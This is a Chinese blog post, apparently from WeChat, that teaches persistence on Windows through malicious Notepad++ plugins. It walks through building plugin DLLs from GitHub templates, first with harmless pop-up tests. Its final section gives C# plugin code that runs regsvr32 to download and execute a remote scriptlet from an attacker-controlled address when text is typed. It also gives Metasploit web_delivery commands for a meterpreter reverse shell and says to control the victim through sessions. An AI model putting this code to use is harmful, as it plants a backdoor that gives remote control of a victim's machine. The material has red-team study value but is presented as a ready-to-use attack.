<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QQ0unbFi_gipsY1OBE6pqg)

前言：已开通交流群可在公众号精选文章进入。

前几天在 sechub 平台拿到了一个课题

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknrtXaicX0z1Ttoy98SocBeKlr3trI0Qguib6bCqictprCZzibhX4NvInKng/640?wx_fmt=png)

但是这段时间有点忙所以就没写，等开始写的时候已经过期了，今天就补一篇哈哈

**Notepade++：  
**

![](https://mmbiz.qpic.cn/mmbiz_jpg/licEEwv67W2aee68FhY2bEVvEM5KiaaSknE7nFj1RCtPxviculeL3xXhYhzcLfYx3TZJece0OhDmDicnK2iaI195Qdw/640?wx_fmt=jpeg)

   Notepade++ 是一款 Windows 中的免费文本编辑器，其功能非常强大，即可以编辑普通文本内容当作记事本，还可以编辑类似 python，Html，C 等等的代码所以是很多普通用户，开发者和安全爱好者电脑必不可少的一款工具也是花某平常使用最频繁的一款编辑器**。  
**

**自定义插件：  
**

  而花某最喜欢的就是它的自定义插件功能，可以自己添加非常多的插件用于扩展功能，最重要的是可以不用去官方商城下载官方插件可以使用自己开发的插件，所以就可以利用它实现命令执行和运行脚本等目的。  

**实操：  
**

  项目 1：

```
https://github.com/npp-plugins/plugintemplate

```

此项目为不会插件开发的准备了一个模板只需要修改些许代码即可实现自己的测试功能。  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknmtAHwUeP2LGaXt4nfPePcTlQn96wUlKJVouKibia9J6jYptSTl4iaWJSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkntGVHbabHJxVkEgwfHXWXkdcEMw5lYnGwoDhHyF7tqrBxVXFprQaugA/640?wx_fmt=png)

```
https://github.com/npp-plugins/plugintemplate/releases/download/v4.3/pluginTemplate.v4.3.bin.arm64.zip

```

也可直接下载这个，下载完成后先用 VS studio 打开 "\plugintemplate-master\src\PluginDefinition.h" 文件

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkn029nps2Pf9f64A2ibLBrib6k5CY8aG9Bia2n9Cm24KibPYia45DKBc2rHJw/640?wx_fmt=png)

31 行位置 const TCHAR NPP_PLUGIN_NAME 的 TEXT 可以随意起个名字

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknG240E03iacClurKibEWzCROYibDhJmOnkdGFSrpbJR89nFCtAiaVdO8IiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknav8jbViaJQxE1zZ2SZXR6PHNadN7GzJFuloWicdVymtPdylnevQqeb9w/640?wx_fmt=png)

这里的值不能为 0，项目存在两个测试内容，改完配置内容再打开 "plugintemplate-master\src\PluginDefinition.cpp" 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknRqtibB9JWZNTUibO40rSKYZylVYnsicl9fAcEDl2VBCicOWaCicjpxpovmg/640?wx_fmt=png)

添加弹窗测试代码：

```
void pluginInit(HANDLE /*hModule*/)
{
    MessageBox(NULL, TEXT(""), TEXT("test"), NULL);
}

```

然后生成 Dll  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknD1jt08xibZyfSQEdxzHVia9TdsAJzQcNuDttOVibzpVARGTzLicic4zymhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkn0kVKwHtwibovxF9vfp7vDtQdTKwgnrdQ60R4Zic504S4NuDNrr1X3Upg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknpzC6zS5Fiasca0ce0SDtLUsPqPrnmnZhnKFlECjlFpTUbnXNafoovicg/640?wx_fmt=png)

随后创建文件夹叫：“rt test”

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknX2xSIaqcpQ14kbkCVbZ7JQOAmqJRtEwfGZKNPmUedSDGd5TIuIz8Kg/640?wx_fmt=png)

把生成的 dll 拖进去

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknhHWCTVHdziaGaD3JD3XyufB4KnSsyy5Cu4PypLa8FibqoiabibYY57CeMA/640?wx_fmt=png)

然后找到 notepade++ 的 plugins 文件夹路径是 C:\Notepad++\plugins 注：notepade++ 插件的文件名夹名和 dll 文件名得是同一个。  

做完这些后我们可以新建一个文本文档去查看效果。

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknSrCYTJxibkRJEvkH7ZUjHmjdfk5XxcaOOgDQpxKngLtbcsdk0xIWDIQ/640?wx_fmt=png)

输入字符成功弹窗。

项目 2：

```
https://github.com/kbilste/NotepadPlusPlusPluginPack.Net

```

此开发项目对于前面的项目来说开放性更大，对于前者来说它提供的只有 2 种测试方案，而此开发项目给出开发模板的同时可以在模板内开发出更多的测试代码从而去实现权限维持目的。

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknBXq4us2lccqrAPRSTzv1C8TfU89iap2YA9Lpwic0NVkgY8knC36K2v3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknGxbt7aoVj6XuKXtEicEDjRz4KjyvHyXbxKNeHwcQaDG8Ys1ia0HloCiaw/640?wx_fmt=png)

项目底部也有说明

首先下载项目源码：

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkn1icddqJGlAyG5fQmOhURhD9Fia7sjs6MameTvU68sghQTqNjmVwIuzpQ/640?wx_fmt=png)

在 VS studio 选择新建项目：  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknc0GqKnjLHUtpaJzpgN6Twp3ByrYRYFPjYSgnsJS7VQkPXSFyjiaRZbQ/640?wx_fmt=png)

选择类库

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknHxCeCFseck5HUAbVaiavwpetOBSLiamdWfHqXX6k7aFcPia0K4MR9Zticg/640?wx_fmt=png)

因为项目是 C# 的所以选择创建 C# 类库项目

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknZpY0ic7dpDYOjUiaibPiaYSH8fLdf8olQZrAxpJzMXX1USaibgZTjXaV96A/640?wx_fmt=png)

项目名称输入 “rt rest2”

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknXzOh4AAWYHF1zBoibZNReHKh4hLV9F7tPGssurw51yOtMiczI07MuBbw/640?wx_fmt=png)

框架选择要 4.5 往上要不然错误一堆，创建完毕后点击打开文件

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknI2ZPAvz5EAfT5Ofe2jQxf2d7ddwniaWR9QrZ0KEsp1bYL43jtFYrib3w/640?wx_fmt=png)

打开 Visual Studio Project Template C# 文件下的 Main.cs 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknOzhoicckBAc4trXYdAHTAyCpJVQs388zb4bbegsGfyGKT3N1rHKlZTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknOicxlpHF2vp5Eekib4pdb78HDpzrleA5L7Hq73FnoIvECsZicSnNVM1Eg/640?wx_fmt=png)

这里的 OnNotification 部分是供大家自定义的

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknzHCvtusnUiawPUmC0W4d17kMsYRHVWBYLZE4icrcPLo21YJMb7cfxB3g/640?wx_fmt=png)

测试代码：

```
class Main
{
    static bool ExecuteOnce = true;
    public static void OnNotification(ScNotification notification)
    {
        if (notification.Header.Code == (uint)SciMsg.SCI_ADDTEXT && ExecuteOnce)
        {
            MessageBox.Show("rt test2");
            ExecuteOnce = !ExecuteOnce;
        }
    }

```

   首先在 class Malin 下添加上面的 static bool ExecuteOnce = true；代码

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknvicNKNvdEVyFtzcVwmzHsibQUHpjxIn6zfrvTqib9jCibhia3qHghzGoq3g/640?wx_fmt=png)

然后在自定义部分粘贴其余代码：

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknH5GiaPia8W35wRCsNEetHFJBAhia6eVwGGhDnlfwtOnT1jWtKQibfKNWmg/640?wx_fmt=png)

编译生成 Dll 文件

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknFL5FbnZYsFbf7M2JBQia1yIbQzIvibv4CVNz7PpWCHB5qrWxznkOg0AA/640?wx_fmt=png)

和上步同样创建 rt test2 文件夹拖入生成的 dll

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknyiap1HNnYSgrDrDf6OhQOSzlEyYsJ7Q9lpoNO9MRiasvPbLZ9PicInyog/640?wx_fmt=png)

再放到 Notepade++ 的 plugins 文件夹下创建 rt test2.txt 文本进行测试

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkn6LxC8TgWqOHicUhFyv49zO5GUEpOLyDMoR3nkcI44VicQy0lJUzDNpmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknswEJARS17ico1nkxFuETGXkMPgQNj2zBvE88ubGsbldFHIXJbWpdH0g/640?wx_fmt=png)

成功弹窗。

**反弹 shell：**

pentestlab.blog 公开的测试代码：

```
class   Main
     {
    static   bool   firstRun =  true ;
         public   static   void   OnNotification(ScNotification notification)
         {
             if   (notification.Header.Code == ( uint )SciMsg.SCI_ADDTEXT && firstRun)
             {
                 string   strCmdText;
                 strCmdText =  "/s /n /u /i: http://10.0.0.3:8080/nHIcvfz6N.sct  scrobj.dll" ;
                 Process.Start( "regsvr32" , strCmdText);
                 firstRun = !firstRun;
                 }
             }

```

使用 regsvr32 命令来注册一个 DLL 文件，大家可以根据自己的情况去更改  

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknUXFPy3YX7D8z4SsMGh3mQ8QFISKcOgtI90qSwOkicHv1t4pYHa2Owdg/640?wx_fmt=png)

MSF：

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set LHOST xxx
set LPORT xxx
run

```

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSkndU6WSW17s5FNro4FZTnQzWsKv07Z138mqqXjw2RIKfcunCUfyqJ8ibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/licEEwv67W2aee68FhY2bEVvEM5KiaaSknfiaTwnoCPGN7s2xCery0SwibTOOfb3uS7T814c5qXbVCuomIhTgTuG2w/640?wx_fmt=png)

**然后直接用`sessions管理连接进行操作即可。  
`**

`总结：`

 `总体来说，Notepade进行权限维持也还是存在局限性的且对于完全没接触过开发的人来说上手难度也还是有的。`